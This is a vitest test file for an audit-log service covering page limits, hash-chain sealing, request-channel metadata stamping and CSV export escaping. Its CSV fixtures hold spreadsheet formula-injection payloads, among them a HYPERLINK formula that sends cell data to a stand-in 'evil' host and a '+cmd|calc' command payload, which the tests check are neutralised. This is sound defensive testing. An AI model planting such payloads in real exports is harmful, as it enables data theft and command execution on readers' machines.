// @vitest-environment node

/**
 * The audit-log read surface over a recording fake of the postgres.js tag:
 * the page size that reaches `LIMIT` (every door pages through
 * `listAuditLogs`, so the clamp lives there) and the CSV export's
 * neutralisation of spreadsheet-formula cells — the export's reader is the
 * org's most privileged one, and titles and e-mails are member-authored.
 */

import { RETRY_QUEUE_LOCK_CLASS } from '@tale/shared/db/serializable';
import type { Sql, TransactionSql } from 'postgres';
import { describe, expect, it, vi } from 'vitest';

import { computeAuditHash } from '../../core/lib/helpers/audit_hash.ts';
import { runInRequestChannel } from '../../lib/request-channel.ts';
import { rowToHashInput } from './hash-input.ts';
import {
  auditChainQueueKey,
  buildAuditExport,
  createAuditLog,
  listAuditLogs,
  sealAuditChain,
} from './service.ts';
import type { AuditLogRow } from './types.ts';

interface Statement {
  text: string;
  values: unknown[];
}

function fakeSql(rows: unknown[] = []): { sql: Sql; statements: Statement[] } {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    let text = '';
    const flat: unknown[] = [];
    strings.forEach((part, index) => {
      text += part;
      if (index >= values.length) return;
      const value = values[index];
      if (
        typeof value === 'object' &&
        value !== null &&
        'unsafeText' in value
      ) {
        text += String(value.unsafeText);
      } else {
        text += '?';
        flat.push(value);
      }
    });
    text = text.replace(/\s+/g, ' ').trim();
    statements.push({ text, values: flat });
    return Promise.resolve(rows);
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { sql: tag as unknown as Sql, statements };
}

/**
 * Recording fake of a transaction tag whose answer depends on the statement
 * — the chain-head lock returns a head, the audit INSERT an id, and a
 * responder may throw to stand in for a Postgres error.
 */
function fakeTx(respond: (statement: Statement) => unknown[]): {
  tx: TransactionSql;
  statements: Statement[];
} {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    const text = strings
      .reduce(
        (acc, part, index) =>
          `${acc}${part}${index < values.length ? '?' : ''}`,
        '',
      )
      .replace(/\s+/g, ' ')
      .trim();
    const statement = { text, values };
    statements.push(statement);
    try {
      return Promise.resolve(respond(statement));
    } catch (error) {
      return Promise.reject(error);
    }
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { tx: tag as unknown as TransactionSql, statements };
}

function limitOf(statements: Statement[]): unknown {
  const query = statements.find((s) => s.text.includes('FROM app.audit_logs'));
  return query?.values.at(-1);
}

describe('listAuditLogs — page size [AUDIT-R4]', () => {
  it.each([
    [-5, 2],
    [0, 2],
    [2.7, 3],
    [50, 51],
    [10_000, 201],
  ])(
    'clamps limit %s to a LIMIT of %s (page + 1 lookahead)',
    async (limit, expected) => {
      const fake = fakeSql();
      await listAuditLogs(fake.sql, 'org_1', { limit });
      expect(limitOf(fake.statements)).toBe(expected);
    },
  );

  it('defaults to 50', async () => {
    const fake = fakeSql();
    await listAuditLogs(fake.sql, 'org_1');
    expect(limitOf(fake.statements)).toBe(51);
  });
});

describe('buildAuditExport — CSV', () => {
  const row = (overrides: Partial<AuditLogRow>): AuditLogRow => ({
    id: 'a1',
    organizationId: 'org_1',
    actorId: 'u1',
    actorEmail: null,
    actorEmailHash: null,
    actorRole: null,
    actorType: 'user',
    action: 'document.rename',
    category: 'data',
    resourceType: 'document',
    resourceId: 'd1',
    resourceName: null,
    previousState: null,
    newState: null,
    changedFields: null,
    sessionId: null,
    ipAddress: null,
    actorIpHash: null,
    userAgent: null,
    requestId: null,
    timestamp: 0,
    status: 'success',
    errorMessage: null,
    metadata: null,
    integrityHash: 'h',
    previousHash: null,
    chainSeq: '1',
    piiScrubbed: null,
    ...overrides,
  });

  it('neutralises formula prefixes in member-authored cells [AUDIT-R6]', async () => {
    const fake = fakeSql([
      row({
        resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
        actorEmail: '+cmd|calc',
        errorMessage: '-1+1',
      }),
      row({ id: 'a2', resourceName: '@SUM(A1)' }),
      row({ id: 'a3', resourceName: '\tsneaky' }),
      row({ id: 'a4', resourceName: 'Quarterly report, final' }),
    ]);

    const built = await buildAuditExport(fake.sql, 'org_1', { format: 'csv' });
    const lines = built.content.split('\n');

    expect(lines[1]).toContain(`"'=HYPERLINK(""http://evil/""&A1,""x"")"`);
    expect(lines[1]).toContain(`'+cmd|calc`);
    expect(lines[1]).toContain(`'-1+1`);
    expect(lines[2]).toContain(`'@SUM(A1)`);
    expect(lines[3]).toContain(`'\tsneaky`);
    // Ordinary text is untouched — quoted only for the comma.
    expect(lines[4]).toContain('"Quarterly report, final"');
    expect(lines[4]).not.toContain("'Quarterly");
  });
});

describe('createAuditLog — written unsealed [AUDIT-R8]', () => {
  const args = {
    organizationId: 'org_1',
    actorId: 'u1',
    actorType: 'user' as const,
    action: 'document.rename',
    category: 'data' as const,
    resourceType: 'document',
    resourceId: 'd1',
    status: 'success' as const,
  };

  it('inserts the row and nothing else: no chain lock, no chain head, no hash', async () => {
    const fake = fakeTx((statement) =>
      statement.text.includes('INSERT INTO app.audit_logs')
        ? [{ id: 'a1' }]
        : [],
    );
    Object.assign(fake.tx, { json: (value: unknown) => ({ json: value }) });
    await expect(createAuditLog(fake.tx, args)).resolves.toBe('a1');
    expect(fake.statements).toHaveLength(1);
    const insert = fake.statements[0]?.text ?? '';
    expect(insert).toContain('INSERT INTO app.audit_logs');
    expect(insert).not.toContain('integrity_hash');
    expect(insert).not.toContain('chain_seq');
  });
});

/** A row as the sealer reads it back: written, not sealed yet. */
function unsealedRow(id: string, ts: number): AuditLogRow {
  return {
    id,
    organizationId: 'org_1',
    actorId: 'u1',
    actorEmail: null,
    actorEmailHash: null,
    actorRole: null,
    actorType: 'user',
    action: 'document.rename',
    category: 'data',
    resourceType: 'document',
    resourceId: id,
    resourceName: null,
    previousState: null,
    newState: null,
    changedFields: null,
    sessionId: null,
    ipAddress: null,
    actorIpHash: null,
    userAgent: null,
    requestId: null,
    timestamp: ts,
    status: 'success',
    errorMessage: null,
    metadata: null,
    integrityHash: null,
    previousHash: null,
    chainSeq: null,
    piiScrubbed: null,
  };
}

/** A pool whose `begin` runs the callback on a recording transaction. */
function fakePool(respond: (statement: Statement) => unknown[]): {
  sql: Sql;
  statements: Statement[];
} {
  const fake = fakeTx(respond);
  const sql = Object.assign(
    (strings: TemplateStringsArray, ...values: unknown[]) =>
      (
        fake.tx as unknown as (
          s: TemplateStringsArray,
          ...v: unknown[]
        ) => unknown
      )(strings, ...values),
    {
      unsafe: (text: string) => ({ unsafeText: text }),
      begin: (
        _mode: string,
        callback: (tx: TransactionSql) => Promise<unknown>,
      ) => callback(fake.tx),
    },
  );
  // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- the sealer touches only the tag and begin
  return { sql: sql as unknown as Sql, statements: fake.statements };
}

describe('sealAuditChain — the sealer [AUDIT-R8]', () => {
  it('hashes each waiting row onto the one before it and gives it the next position', async () => {
    const first = unsealedRow('a1', 1_000);
    const second = unsealedRow('a2', 2_000);
    const pool = fakePool((statement) => {
      if (statement.text.includes('pg_try_advisory_xact_lock')) {
        return [{ locked: true }];
      }
      if (statement.text.includes('integrity_hash IS NULL')) {
        return [first, second];
      }
      if (statement.text.includes('FROM app.audit_chain_heads')) {
        return [{ lastHash: 'h0', lastTs: 500, lastSeq: '7' }];
      }
      return [];
    });
    await expect(sealAuditChain(pool.sql, 'org_1')).resolves.toBe(2);

    const firstHash = await computeAuditHash('h0', rowToHashInput(first));
    const secondHash = await computeAuditHash(
      firstHash,
      rowToHashInput(second),
    );
    const sealed = pool.statements.find((s) =>
      s.text.includes('UPDATE app.audit_logs'),
    );
    expect(sealed?.values).toEqual([
      ['a1', 'a2'],
      ['h0', firstHash],
      [firstHash, secondHash],
      ['8', '9'],
    ]);
    const head = pool.statements.find((s) =>
      s.text.includes('UPDATE app.audit_chain_heads'),
    );
    expect(head?.values).toEqual([secondHash, 2_000, '9', 'org_1']);
    // The key is tried before any row is touched.
    expect(pool.statements[0]?.text).toContain('pg_try_advisory_xact_lock');
    expect(pool.statements[0]?.values).toEqual([
      RETRY_QUEUE_LOCK_CLASS,
      auditChainQueueKey('org_1'),
    ]);
  });

  it('starts a new chain with no previous hash', async () => {
    const pool = fakePool((statement) => {
      if (statement.text.includes('pg_try_advisory_xact_lock')) {
        return [{ locked: true }];
      }
      if (statement.text.includes('integrity_hash IS NULL')) {
        return [unsealedRow('a1', 1_000)];
      }
      if (statement.text.includes('FROM app.audit_chain_heads')) {
        return [{ lastHash: '', lastTs: 0, lastSeq: '0' }];
      }
      return [];
    });
    await sealAuditChain(pool.sql, 'org_1');
    const sealed = pool.statements.find((s) =>
      s.text.includes('UPDATE app.audit_logs'),
    );
    expect(sealed?.values[1]).toEqual([null]);
    expect(sealed?.values[3]).toEqual(['1']);
  });

  it('leaves the rows to the next pass while another holder has the chain', async () => {
    const pool = fakePool((statement) =>
      statement.text.includes('pg_try_advisory_xact_lock')
        ? [{ locked: false }]
        : [unsealedRow('a1', 1_000)],
    );
    await expect(sealAuditChain(pool.sql, 'org_1')).resolves.toBe(0);
    expect(pool.statements).toHaveLength(1);
  });
});

/**
 * A write a coding agent caused deep inside a domain says so: the MCP door
 * runs each tool call in a request channel, and every audit row written
 * during it carries the door, the tool, the key and the client — stamped
 * before the row is hashed, so the stored row verifies.
 */
describe('createAuditLog — the request channel', () => {
  const args = {
    organizationId: 'org_1',
    actorId: 'u1',
    actorType: 'user' as const,
    action: 'automation.run.cancelled',
    category: 'workflow' as const,
    resourceType: 'automation_run',
    resourceId: 'run_1',
    status: 'success' as const,
  };
  const channel = {
    via: 'mcp' as const,
    requestId: 'req-mcp-1',
    tool: 'cancel_run',
    apiKeyId: 'key_1',
    clientName: 'Claude Code',
  };

  /** The INSERT's metadata, request id and every stored value. */
  async function insertOf(
    run: (tx: TransactionSql) => Promise<string>,
  ): Promise<{ metadata: unknown; requestId: unknown; values: unknown[] }> {
    const fake = fakeTx((statement) =>
      statement.text.includes('INSERT INTO app.audit_logs')
        ? [{ id: 'a1' }]
        : [],
    );
    Object.assign(fake.tx, { json: (value: unknown) => ({ json: value }) });
    await run(fake.tx);
    const insert = fake.statements.find((s) =>
      s.text.includes('INSERT INTO app.audit_logs'),
    );
    const values = insert?.values ?? [];
    const metadata = values[22];
    return {
      metadata:
        metadata !== null && typeof metadata === 'object' && 'json' in metadata
          ? metadata.json
          : metadata,
      requestId: values[18],
      values,
    };
  }

  it('stamps the door, tool, key and client of an MCP call on every row written inside it', async () => {
    const written = await insertOf((tx) =>
      runInRequestChannel(channel, () => createAuditLog(tx, args)),
    );
    expect(written.metadata).toEqual({
      via: 'mcp',
      tool: 'cancel_run',
      apiKeyId: 'key_1',
      clientName: 'Claude Code',
    });
    expect(written.requestId).toBe('req-mcp-1');
  });

  it('keeps what the writer said: its own metadata, its own via and its own request id', async () => {
    const merged = await insertOf((tx) =>
      runInRequestChannel(channel, () =>
        createAuditLog(tx, { ...args, metadata: { runId: 'run_1' } }),
      ),
    );
    expect(merged.metadata).toEqual({
      via: 'mcp',
      tool: 'cancel_run',
      apiKeyId: 'key_1',
      clientName: 'Claude Code',
      runId: 'run_1',
    });
    const own = await insertOf((tx) =>
      runInRequestChannel(channel, () =>
        createAuditLog(tx, {
          ...args,
          requestId: 'req-own',
          metadata: { via: 'upload' },
        }),
      ),
    );
    expect(own.metadata).toEqual({ via: 'upload' });
    expect(own.requestId).toBe('req-own');
  });

  it('stores the stamped row exactly as a row the writer stamped itself, so the sealer hashes them alike', async () => {
    vi.useFakeTimers();
    try {
      vi.setSystemTime(1_760_000_000_000);
      const inChannel = await insertOf((tx) =>
        runInRequestChannel(channel, () => createAuditLog(tx, args)),
      );
      const explicit = await insertOf((tx) =>
        createAuditLog(tx, {
          ...args,
          requestId: 'req-mcp-1',
          metadata: {
            via: 'mcp',
            tool: 'cancel_run',
            apiKeyId: 'key_1',
            clientName: 'Claude Code',
          },
        }),
      );
      expect(inChannel.values).toEqual(explicit.values);
    } finally {
      vi.useRealTimers();
    }
  });

  it('adds nothing outside a channel', async () => {
    const written = await insertOf((tx) => createAuditLog(tx, args));
    expect(written.metadata).toBeNull();
    expect(written.requestId).toBeNull();
  });

  it('names the key that made the call even when the writer records another under the same name [MCP-R14]', async () => {
    // Ada's agent creates an API key "ci" over MCP with her key "laptop":
    // the row must point an admin at "laptop", the key that acted.
    const written = await insertOf((tx) =>
      runInRequestChannel(channel, () =>
        createAuditLog(tx, {
          ...args,
          metadata: {
            apiKeyId: 'key_ci',
            tool: 'something_else',
            clientName: 'Spoofed',
            keyName: 'ci',
          },
        }),
      ),
    );
    expect(written.metadata).toEqual({
      via: 'mcp',
      tool: 'cancel_run',
      apiKeyId: 'key_1',
      clientName: 'Claude Code',
      keyName: 'ci',
    });
  });

  it("stamps a REST write made with Ada's key as the key's, with the request id", async () => {
    const written = await insertOf((tx) =>
      runInRequestChannel(
        { via: 'api-key', requestId: 'req-rest-1', apiKeyId: 'key_9' },
        () => createAuditLog(tx, args),
      ),
    );
    expect(written.metadata).toEqual({ via: 'api-key', apiKeyId: 'key_9' });
    expect(written.requestId).toBe('req-rest-1');
    const unnamed = await insertOf((tx) =>
      runInRequestChannel({ via: 'api-key', apiKeyId: 'key_9' }, () =>
        createAuditLog(tx, args),
      ),
    );
    expect(unnamed.requestId).toBeNull();
  });
});
